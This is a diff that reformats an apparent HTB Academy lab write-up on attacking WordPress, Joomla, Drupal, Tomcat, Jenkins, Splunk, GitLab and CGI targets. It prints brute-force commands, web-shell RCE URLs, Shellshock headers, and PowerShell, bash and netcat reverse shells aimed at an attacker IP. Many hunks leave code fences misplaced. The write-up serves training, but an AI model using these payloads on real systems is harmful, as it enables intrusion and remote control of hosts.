@@ -102,7 +102,7 @@ we got:
 
 first, we install aquatone with the command
 wget
-https://github.com/michenriksen/aquatone/releases/download/v
+`https://github.com/michenriksen/aquatone/releases/download/v`
 1.7.0/aquatone_linux_amd64_1.7.0.zip
 then unzip it with the command
 ```bash
@@ -136,18 +136,17 @@ now, before we run aquatone, we need to install chrome (it is not in the formal
 guide, but for me running aquatone without it resulted with error).
 We will do it with the following commands (for Ubuntu/Debian):
 ```bash
-wget https://dl.google.com/linux/direct/google-chrome-
-```
-stable_current_amd64.deb
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 ```bash
+```
 sudo dpkg -i google-chrome-stable_current_amd64.deb
 sudo apt-get install -f
 ```
 after that it should do well.
 Next, we run the command:
-```bash
 cat web_discovery.xml | ./aquatone -nmap
 ```
+```bash
 to run aquatone on the web_discovery.xml (our nmap output):
 
 At the end of the running, we get the message:
@@ -198,7 +197,7 @@ When it's done, we will have to run enumeration on the website files.
 For that purpose, we will use a tool called 'dirbuster'.
 we install 'dirbuster' directly from GitHub repository with the command:
 git clone
-https://gitlab.com/kalilinux/packages/dirbuster.git
+`https://gitlab.com/kalilinux/packages/dirbuster.git`
 after 'dirbuster' is install – we will have the installed directory in our home
 directory:
 
@@ -323,14 +322,14 @@ for our made user.
 Then – we will use the command:
 ```bash
 sudo wpscan --url http://blog.inlanefreight.local --
-```
 enumerate --api-token <api-token-value>
+```
 it is recommended to redirect the output report to some output file as we have
 limited use of api-calls:
 ```bash
 sudo wpscan --url http://blog.inlanefreight.local --
-```
 enumerate --api-token <api-token-value> > output_file
+```
 
 when the scan is complete, we will search for the user sections within the
 report:
@@ -355,9 +354,9 @@ we will use the wpscan tool from previous question to bruteforce
 daug password, we will use the command:
 ```bash
 sudo wpscan --password-attack xmlrpc -t 20 -U doug -P
-```
 /usr/share/wordlists/rockyou.txt --url
-http://blog.inlanefreight.local > output_file2
+`http://blog.inlanefreight.local > output_file2`
+```
 where rockyou.txt is the password list file we use (stored in pwnbox machine),
 xmlrpc is the attack type, -t is the amount of threads, -U is the target user, -P is
 the path to the password list file, --url is the target url of the WordPress site.
@@ -406,8 +405,7 @@ in this guide we shall cover both methods:
 
 web interface:
 we enter to the browser this url:
-http://blog.inlanefreight.local/wp-
-content/themes/twentynineteen/404.php?0=id
+`http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`
 
 
 Of course, the 'we-content/themes' is the path our themes are stored, and
@@ -422,13 +420,11 @@ cat /etc/passwd | grep bash
 ```
 now for the url, with the encoding of space (' ') to ascii ('%20') (space value is
 hexadecimal 20 in ascii):
-http://blog.inlanefreight.local/wp-
-content/themes/twentynineteen/404.php?0=cat%20/etc/passwd%20
+`http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20/etc/passwd%20`
 |%20grep%20bash
 (Note, it worked for me even without the URL encoding but entering it plainly
 as:
-http://blog.inlanefreight.local/wp-
-content/themes/twentynineteen/404.php?0=cat /etc/passwd |
+`http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat /etc/passwd |`
 ```bash
 grep bash
 ```
@@ -451,10 +447,9 @@ The answer is the last option.
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-curl "http://blog.inlanefreight.local/wp-
-```
-content/themes/twentynineteen/404.php?0=cat%20/etc/passwd%20
+curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20/etc/passwd%20
 |%20grep%20bash"
+```
 
 
 Providing the same answer the previous method.
@@ -488,28 +483,25 @@ It worked.
 method 1: we use the exploit from last question: first, we run 'pwd'
 so we know where we are with the command:
 ```bash
-curl "http://blog.inlanefreight.local/wp-
+curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=pwd"
 ```
-content/themes/twentynineteen/404.php?0=pwd"
 
 
 It tells us we are in the theme 'twentynineteen' directory, and the main
 directory of this website is 'blog.inlanefreight.local' directory – so we search
 there, using 'ls' command:
 ```bash
-curl "http://blog.inlanefreight.local/wp-
-```
-content/themes/twentynineteen/404.php?0=ls%20/var/www/blog.i
+curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls%20/var/www/blog.i
 nlanefreight.local"
+```
 
 
 We see an interesting looking flag file, lets confirm its readable for anyone with
 'ls -l flag...txt' command:
 ```bash
-curl "http://blog.inlanefreight.local/wp-
-```
-content/themes/twentynineteen/404.php?0=ls%20-
+curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls%20-
 l%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd
+```
 7cb4cb0031ba249.txt"
 
 yes, it is: (r is displayed for all user classes, r is for read permissions)
@@ -530,10 +522,9 @@ yes, it is: (r is displayed for all user classes, r is for read permissions)
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-curl "http://blog.inlanefreight.local/wp-
-```
-content/themes/twentynineteen/404.php?0=cat%20/var/www/blog.
+curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20/var/www/blog.
 inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.tx
+```
 t"
 
 
@@ -589,9 +580,9 @@ first, we will do the 'initial configuration' on vhost
 When it is done – we will run the command:
 ```bash
 curl -s
-```
 http://dev.inlanefreight.local/administrator/manifests/files
 /joomla.xml | xmllint --format -
+```
 to initiate Joomla discovery and Footprinting the 'Joomla' content and
 management system, to be displayed in xml format:
 
@@ -622,9 +613,8 @@ when done, we go to the git directory (with 'cd Joomla-bruteforce' command)
 and then run the tool with the command:
 ```bash
 sudo python3 joomla-brute.py -u
+http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```
-http://dev.inlanefreight.local -w /usr/share/metasploit-
-framework/data/wordlists/http_default_pass.txt -usr admin
 we basically run bruteforce on the admin user from 'http_default_pass.txt'
 wordlist:
 
@@ -643,7 +633,7 @@ parallel to this question.
 *note – this method is not the instructed method to obtain the flag, but I will
 present it nonetheless:
 First we will go to
-http://dev.inlanefreight.local/administrator/
+`http://dev.inlanefreight.local/administrator/`
 in the browser URL:
 
 ![Figure 18.1 — Lab execution and output verification (Page 18)](/assets/images/posts/htb-academy/attacking-common-applications/p018_01.jpg)
@@ -706,8 +696,8 @@ then we go our way in (with 'cd') to the created CVE-2019-10945 directory.
 When we do, we run the command:
 ```bash
 python3 CVE-2019-10945.py --url
-```
 "http://dev.inlanefreight.local/administrator/" --username
+```
 admin --password admin --dir /
 
 ![Figure 21.1 — Lab execution and output verification (Page 21)](/assets/images/posts/htb-academy/attacking-common-applications/p021_01.jpg)
@@ -743,8 +733,8 @@ Then – we run the command:
 ```bash
 curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt |
 grep -m2 ""
-```
 (curl the address above, path '/CHANGELOG.txt', and display the first 2 lines):
+```
 
 The version is displayed.
 
@@ -757,7 +747,7 @@ Answer: DrUp@l_drUp@l_3veryWh3Re!
 Method: first, we will do the 'initial configuration' on the vhosts 'drupal-
 dev.inlanefreight.local' and 'drupal-qa.inlanefreight.local'.
 Then – got to
-http://drupal-qa.inlanefreight.local/
+`http://drupal-qa.inlanefreight.local/`
 
 now, we going to use the exploit 'Drupalgeddon' vulnerability (CVE-2014-3704)
 to create a user with administrative privileges.
@@ -839,9 +829,8 @@ Then we go to 'basic page':
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-curl -s http://drupal-
+curl -s http://drupal-qa.inlanefreight.local/node/4?maliciousparameter=pwd | grep
 ```
-qa.inlanefreight.local/node/4?maliciousparameter=pwd | grep
 encoded
 the reason the grep is necessary here, is because in here the output is the
 entire html content of the page, and not just the desired output:
@@ -865,19 +854,17 @@ entire html content of the page, and not just the desired output:
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-curl -s "http://drupal-
-```
-qa.inlanefreight.local/node/4?maliciousparameter=ls%20../dru
+curl -s "http://drupal-qa.inlanefreight.local/node/4?maliciousparameter=ls%20../dru
 pal.inlanefreight.local"
+```
 
 After a bit of search, we can find the flag within the output:
 
 Now all we have to do is the cat the flag value with the command:
 ```bash
-curl -s "http://drupal-
-```
-qa.inlanefreight.local/node/4?maliciousparameter=cat%20../dr
+curl -s "http://drupal-qa.inlanefreight.local/node/4?maliciousparameter=cat%20../dr
 upal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc858505
+```
 9b.txt"
 
 
@@ -904,7 +891,7 @@ required, but it wont take long.
 first, we will do the 'initial configuration' on the vhosts 'app-
 dev.inlanefreight.local' and 'web01.inlanefreight.local'.
 Then, on browser to enter the URL:
-http://web01.inlanefreight.local:8180/docs/
+`http://web01.inlanefreight.local:8180/docs/`
 and immediately the answer shall be revealed:
 *not always the tomcat service would be so obvious, we can also use
 'EyeWitness' (the tool from the first section) to determine the website is
@@ -991,12 +978,12 @@ the password was obtained via the bruteforce on the question above:
 
 
 Question: Obtain remote code execution on the
-http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the
+`http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the`
 contents of tomcat_flag.txt
 Answer: t0mcat_rc3_ftw!
 Method: on the last section (tomcat enumeration & discovery) we found the
 Path
-http://web01.inlanefreight.local:8180/manager/html
+`http://web01.inlanefreight.local:8180/manager/html`
 and we found that upon entering we are required to enter credentials:
 
 ![Figure 31.1 — Lab execution and output verification (Page 31)](/assets/images/posts/htb-academy/attacking-common-applications/p031_01.jpg)
@@ -1034,7 +1021,7 @@ And where we can deploy new applications:
 
 #### Technical Methodology & Exploit Execution:
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<pwnbox IP>
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<pwnbox IP>`
 LPORT=<listening port> -f war > backup.war
 after several seconds, we will get the output:
 
@@ -1100,9 +1087,8 @@ might be required to stop it and start another session because ctrl+c wont stop
 the search but the entire netcat session),
 We will use the command
 ```bash
-cat /opt/tomcat/apache-tomcat-
+cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
 ```
-10.0.10/webapps/tomcat_flag.txt
 
 ![Figure 35.1 — Lab execution and output verification (Page 35)](/assets/images/posts/htb-academy/attacking-common-applications/p035_01.jpg)
 *_Figure 35.1 — Lab execution and output verification (Page 35)_*
@@ -1133,7 +1119,7 @@ cat /opt/tomcat/apache-tomcat-
 first, we will do the 'initial configuration' on vhost
 'jenkins.inlanefreight.local'.
 When done, go in browser to
-http://jenkins.inlanefreight.local:8000
+`http://jenkins.inlanefreight.local:8000`
 you will reach a login page:
 
 Enter the credentials admin:admin and Sign in.
@@ -1196,13 +1182,17 @@ that we will enter the url path '/script' for the script console:
 ### for example
 
 We will use this chain of commands to obtain the information we need:
+
+```groovy
 def cmd = '<my-command>'
 def sout = new StringBuffer(), serr = new StringBuffer()
 def proc = cmd.execute()
 proc.consumeProcessOutput(sout, serr)
 proc.waitForOrKill(1000)
 println sout
-for example:
+```
+
+For example:
 
 Which tells us we in the right directory to look for the flag.
 And running ls confirms the flag existence there:
@@ -1243,7 +1233,7 @@ We can observe that port 8000 is open – the default port for splunk, and the
 service running on it is ssl/http (https). We also pay attention for that the
 Splunk is running on Windows OS.
 So we enter in the browser the URL
-https://<target-IP>:8000
+`https://<target-IP>:8000`
 and it takes us to a warning page:
 
 ![Figure 40.1 — Lab execution and output verification (Page 40)](/assets/images/posts/htb-academy/attacking-common-applications/p040_01.jpg)
@@ -1285,7 +1275,7 @@ So we will use this GitHub repository to create PowerShell script to grant us
 remote code execution.
 First we clone the repositoy:
 git clone
-https://github.com/0xjpuff/reverse_shell_splunk.git
+`https://github.com/0xjpuff/reverse_shell_splunk.git`
 
 and then enter the created directory:
 
@@ -1498,7 +1488,7 @@ get Users\Administrator\Desktop\flag.txt
 
 
 
-### <pwnbox-port>
+### Reverse Shell Method
 
 Now on our own pwnbox machine, we run 'ls' to confirm flag existence:
 
@@ -1506,23 +1496,16 @@ Flag existence confirm, now all we have to do is to get it with 'cat':
 
 
 Method 2: obtain reverse shell:
-For this method  this guide helped a lot (there is also Metasploit method there
-but I did not implemented it).
-First, we add new notification as the previous method (called shell)
-But this time, on parameters – we add this reverse shell PowerShell script:
-shell;"$client = New-Object
-System.Net.Sockets.TCPClient('<pwnbox-IP>',<pwnbox-
-port>);$stream = $client.GetStream();[byte[]]$bytes =
-0..65535|%{0};while(($i = $stream.Read($bytes, 0,
-$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
-System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback
-= (iex $data 2>&1 | Out-String );$sendback2 = $sendback +
-'PS ' + (pwd).Path + '> ';$sendbyte =
-([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write(
-$sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close
-()"
-make sure to change <pwnbox-IP> to attacker machine IP , and same with
-<pwnbox-port>:
+For this method this guide helped a lot (there is also Metasploit method there
+but I did not implement it).
+First, we add a new notification like the previous method (called shell)
+But this time, in parameters – we add this reverse shell PowerShell script:
+
+```powershell
+shell;"$client = New-Object System.Net.Sockets.TCPClient('<pwnbox-IP>',<pwnbox-port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Make sure to change `<pwnbox-IP>` to attacker machine IP, and same with `<pwnbox-port>`:
 
 ![Figure 51.1 — Lab execution and output verification (Page 51)](/assets/images/posts/htb-academy/attacking-common-applications/p051_01.jpg)
 *_Figure 51.1 — Lab execution and output verification (Page 51)_*
@@ -1766,7 +1749,7 @@ Now we also need a wordlist, we will head to the question hint ('Use a wordlist
 from Seclists (in /opt/useful/SecLists/Usernames on the Pwnbox).')
 and we run the command:
 ./gitlab_userenum.sh --url
-http://gitlab.inlanefreight.local:8081/ --userlist
+`http://gitlab.inlanefreight.local:8081/ --userlist`
 /opt/useful/SecLists/Usernames/cirt-default-usernames.txt|
 ```bash
 grep exists
@@ -1803,11 +1786,11 @@ nc -lnvp 4444
 when we have a listener on, we run the command:
 ```bash
 python3 gitlab_13_10_2_rce.py -t
-```
 http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1
 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc
-<pwnbox-IP> 8443 >/tmp/f '
+`<pwnbox-IP>` 8443 >/tmp/f '
 running the script..
+```
 
 And we got shell:
 
@@ -1853,8 +1836,8 @@ For that we will run ffuf web enumation tool, targeting /cgi/FUZZ.cmd
 (targeting the default directory of CGI with fuzzing attack:
 ```bash
 ffuf -w /usr/share/dirb/wordlists/common.txt -u
-```
 http://<target-IP>:8080/cgi/FUZZ.bat | grep 200
+```
 the results we filtering for http status code 200 (SUCSESS)
 
 ![Figure 63.1 — Lab execution and output verification (Page 63)](/assets/images/posts/htb-academy/attacking-common-applications/p063_01.jpg)
@@ -1868,13 +1851,13 @@ the results we filtering for http status code 200 (SUCSESS)
 ### in the browser URL
 
 now lets enter
-http://<target-IP>:8080/cgi/welcome.bat
+`http://<target-IP>:8080/cgi/welcome.bat`
 in the browser URL:
 
 We got this message.
 But as this page is vulnetable for RCE, we can inject commands to the URL like
 this, in this example we run 'cd' (windows version of pwd):
-http://<target-IP>:8080/cgi/welcome.bat?&dir
+`http://<target-IP>:8080/cgi/welcome.bat?&dir`
 
 
 We we got what we wanted.
@@ -1908,7 +1891,7 @@ We will convert the characters to its URL encoding based on their ASCII value:
 
 *from asciitable
 The end result:
-http://<target-IP>:8080/cgi/welcome.bat?
+`http://<target-IP>:8080/cgi/welcome.bat?`
 &c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 
 ![Figure 65.1 — Lab execution and output verification (Page 65)](/assets/images/posts/htb-academy/attacking-common-applications/p065_01.jpg)
@@ -1940,8 +1923,8 @@ may execute unintentional commands.
 For that, we will first run gobuster path enumation with this command:
 ```bash
 gobuster dir -u http://<target-IP>/cgi-bin/ -w
-```
 /usr/share/wordlists/dirb/small.txt -x cgi
+```
 we get this result:
 
 We have a possible path '/access.cgi', however its size is 0.. mmm...
@@ -1949,8 +1932,8 @@ We will try to test the path with the shellshock vulnerability, for test, we wil
 this command:
 ```bash
 curl -H 'User-Agent: () { :; }; echo ; echo ; pwd' bash -s
+:'' http://`<target-IP>`/cgi-bin/access.cgi
 ```
-:'' http://<target-IP>/cgi-bin/access.cgi
 
 ![Figure 66.1 — Lab execution and output verification (Page 66)](/assets/images/posts/htb-academy/attacking-common-applications/p066_01.jpg)
 *_Figure 66.1 — Lab execution and output verification (Page 66)_*
@@ -1966,8 +1949,8 @@ curl -H 'User-Agent: () { :; }; echo ; echo ; pwd' bash -s
 
 ```bash
 curl -H 'User-Agent: () { :; }; /bin/bash -i >&
+/dev/tcp/`<attacker-IP>`/5656 0>&1
 ```
-/dev/tcp/<attacker-IP>/5656 0>&1
 where the 'pwd' was:
 
 ![Figure 67.1 — Lab execution and output verification (Page 67)](/assets/images/posts/htb-academy/attacking-common-applications/p067_01.jpg)
@@ -1984,10 +1967,8 @@ where the 'pwd' was:
 ### Lets see the listener
 
 ```bash
-curl -H 'User-Agent: () { :; }; /bin/bash -i >&
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-IP>/5656 0>&1' http://<target-IP>/cgi-bin/access.cgi
 ```
-/dev/tcp/<attacker-IP>/5656 0>&1' http://<target-IP>/cgi-
-bin/access.cgi
 
 
 Lets see the listener:
@@ -2018,8 +1999,8 @@ From here obtaining the flag is simply a matter of 'ls' and 'cat':
 we will login to the windows machine with this rdp command:
 ```bash
 xfreerdp /u:cybervaca /p:'&aue%C)}6g-d{w' /v:<Target IP>
-```
 /dynamic-resolution
+```
 
 
 Upon activating the Windows machine, we are being greeted by various
@@ -2297,8 +2278,8 @@ password field in line 20.
 we will login to the windows machine with this rdp command:
 ```bash
 xfreerdp /u:cybervaca /p:'&aue%C)}6g-d{w' /v:<Target IP>
-```
 /dynamic-resolution
+```
 when the windows machine is up – we will go to the path 'C:\Apps':
 
 We see the app 'fatty-client.jar'.
@@ -2723,7 +2704,7 @@ cd IIS-ShortName-Scanner/release/
 ```
 
 And run the tool with the command:
-java -jar iis_shortname_scanner.jar 0 5 http://<target-IP>/
+`java -jar iis_shortname_scanner.jar 0 5 http://<target-IP>/`
 *note – you have to change directory first and then run it, placing the path
 prefix like 'IIS-ShortName-Scanner/release/iis...jar......' directly in the command
 without changing directory will NOT work. *
@@ -2766,8 +2747,8 @@ so words like transform, transport... will be picked by the 'egrep' command)
 
 ```bash
 gobuster dir -u http://<target-IP>/ -w /tmp/list.txt -x
-```
 .aspx,.asp
+```
 looking for paths with the extensions '.aspx', '.asp':
 
 ![Figure 98.1 — Lab execution and output verification (Page 98)](/assets/images/posts/htb-academy/attacking-common-applications/p098_01.jpg)
@@ -2796,7 +2777,7 @@ to scan ports 1-10000 (with -sV default script for more information)
 we have ldap - port  389 open. The ldap version is 2.2.X to 2.3.X
 we also have http - port 80 open.
 Lets try to enter the url
-http://<target-IP>
+`http://<target-IP>`
 to the browser:
 
 Now as it is ldap machine, lets try to do ldap injection with asterisk wildcard:
@@ -2833,8 +2814,8 @@ connect to the target machine via ssh, we are provided with the
 credentials root:!x4;EW[ZLwmDx?=w with the command:
 ```bash
 ssh root@<target-IP>
-```
 then we cat for '/opt/asset-manager/app.py', the function we need is 'register':
+```
 
 We can observe that if the request parameter 'active' exists – the function sets
 the variable 'cond' to true, else (or more specifically the error that the lack of
@@ -2983,8 +2964,8 @@ Let's cover the method further, first – we run 'gobuster' on the target machin
 on port 7001
 ```bash
 gobuster dir -u http://<target-IP>:7001 -w
-```
 /usr/share/wordlists/dirb/small.txt
+```
 
 among others – we have the '/console' path:
 
@@ -3020,17 +3001,15 @@ next objective is to install the module on Metasploit.
 The sequence of commands to install the Metasploit module on the machine's
 Metasploit (#the information between the # # are notes #):
 ```bash
-sudo mkdir -p /usr/share/metasploit-
+sudo mkdir -p /usr/share/metasploit-framework/modules/exploits/multi/http/
 ```
-framework/modules/exploits/multi/http/
 # -p flag is to create the directory if it doesn't exists,
 it will also create parents directory if required. #
 
 ```bash
-sudo mv exploit.rb /usr/share/metasploit-
-```
-framework/modules/exploits/multi/http/
+sudo mv exploit.rb /usr/share/metasploit-framework/modules/exploits/multi/http/
 weblogic_admin_handle_rce.rb
+```
 # assuming the exploit.rb is the present working directory #
 
 ```bash
@@ -3044,8 +3023,8 @@ now for Metasploit configurations:
 use weblogic_admin_handle_rce
 set LHOST <attacker-IP>
 set RHOSTS <target-IP>
-```
 RPORT (target port) of course would be 7001, LPORT is 8443 on default (I
+```
 recommend to keep it, I tried to set it to 4545 but then it didn't work (I don't
 know why)), payload default is 'windows/x64/meterpreter/reverse_https' –
 keep it.
@@ -3116,7 +3095,7 @@ Method: see above.
 #### Technical Methodology & Exploit Execution:
 
 we enter in the URL:
-http://<target-IP>:8080/
+`http://<target-IP>:8080/`
 
 
 
@@ -3129,8 +3108,8 @@ To get the cmd command-injection URL – we will use the same ffuf
 enumeration as last time:
 ```bash
 ffuf -w /usr/share/dirb/wordlists/common.txt -u
-```
 http://<target-IP>:8080/cgi/FUZZ.bat | grep 200
+```
 
 
 
@@ -3220,15 +3199,13 @@ first, we will do the 'initial configuration' on vhost
 Now, to find the WordPress instance we need to find a subdomain.
 For that we will use another feature of fuff.
 First we need a word list, there are several options to obtain that, like in here
-or here or in the path '/opt/useful/SecLists/Discovery/DNS/subdomains-
-top1million-5000.txt'.
+or here or in the path '/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt'.
 In this report we will work with the third option.
 We will first run the command:
 ```bash
-ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-
-```
-top1million-5000.txt -u http://<target-IP> -H "Host:
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target-IP> -H "Host:
 FUZZ.inlanefreight.local" -mc 200 -fs 0
+```
 to get all subdomains that return status code 200 (-mc 200), and their size is
 not 0 (-fs, filter size 0):
 
@@ -3237,10 +3214,9 @@ server is configuring to return status code 200 for any of them.
 However, we can observe that they all have the same size, words, and lines.
 All we have to do is to add the flag '-fl' (filter lines) and put the value 923:
 ```bash
-ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-
-```
-top1million-5000.txt -u http://<target-IP> -H "Host:
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target-IP> -H "Host:
 FUZZ.inlanefreight.local" -mc 200 -fl 923 -fs 0
+```
 
 ![Figure 113.1 — Lab execution and output verification (Page 113)](/assets/images/posts/htb-academy/attacking-common-applications/p113_01.jpg)
 *_Figure 113.1 — Lab execution and output verification (Page 113)_*
@@ -3435,7 +3411,7 @@ and when ready, hit 'run':
 find / -path /proc -prune -o -type f -name *flag*.txt
 ```
 2>/dev/null
-*apparently the flag is not merely 'flag.txt' but <prefix>_flag.txt:
+*apparently the flag is not merely 'flag.txt' but `<prefix>`_flag.txt:
 
 Once we found the path, we get the content with 'cat' command:
 ```bash
@@ -3463,8 +3439,8 @@ Method 1: we will login to the windows machine with this rdp
 command:
 ```bash
 xfreerdp /u:Administrator /p:'xcyj8izxNVzhf4z' /v:<Target
-```
 IP> /dynamic-resolution
+```
 now that the windows machine is open – we need to find the DLL first.
 Opening the file explorer:
 
